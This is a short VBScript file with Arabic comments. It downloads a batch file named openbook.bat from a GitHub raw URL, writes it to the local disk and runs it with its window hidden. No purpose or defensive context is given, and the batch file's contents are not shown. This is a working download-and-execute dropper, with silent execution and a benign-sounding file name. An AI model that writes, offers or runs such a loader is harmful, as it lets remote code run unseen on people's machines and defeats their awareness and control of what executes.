Set WshShell = CreateObject("WScript.Shell")

' تنزيل ملف openbook.bat
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objXMLHTTP.Open "GET", "https://github.com/lolohole/my-front-end/raw/main/openbook.bat", False
objXMLHTTP.Send()

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("openbook.bat", True)
objFile.Write objXMLHTTP.ResponseText
objFile.Close

' تشغيل ملف openbook.bat بصمت
WshShell.Run chr(34) & "openbook.bat" & Chr(34), 0

Set WshShell = Nothing
